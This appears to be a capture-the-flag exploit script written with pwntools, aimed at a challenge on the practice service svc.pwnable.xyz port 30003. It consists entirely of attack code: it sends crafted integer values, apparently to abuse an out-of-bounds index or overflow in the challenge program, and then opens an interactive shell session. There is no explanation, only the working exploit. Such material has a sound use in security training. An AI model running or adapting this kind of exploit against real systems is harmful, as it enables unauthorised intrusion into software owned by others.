from pwn import *


r = remote('svc.pwnable.xyz', 30003)
r.sendline("{0} {0} {1}".format(0xb500000000000000 >> 1, -6))
r.recvline()

r.sendline("0 {} {}".format(0xb000000, -5))
r.recvline()
r.sendline('a')
r.interactive()
